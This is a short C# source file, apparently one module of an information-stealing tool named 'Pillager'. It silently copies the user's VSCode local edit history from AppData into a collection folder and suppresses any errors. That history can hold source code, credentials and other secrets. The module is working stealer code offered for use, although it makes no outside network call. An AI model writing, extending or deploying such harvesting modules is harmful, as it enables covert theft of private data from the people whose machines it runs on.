using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Pillager.Softwares
{
    internal class VSCode
    {
        public static string SoftwareName = "VSCode";

        public static void Save(string path)
        {
            try
            {
                string historypath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Code\\User\\History");
                if (!Directory.Exists(historypath)) return;
                string savepath = Path.Combine(path, SoftwareName);
                Directory.CreateDirectory(savepath);
                Methods.CopyDirectory(historypath, Path.Combine(savepath, "History"), true);
            }
            catch { }
        }
    }
}
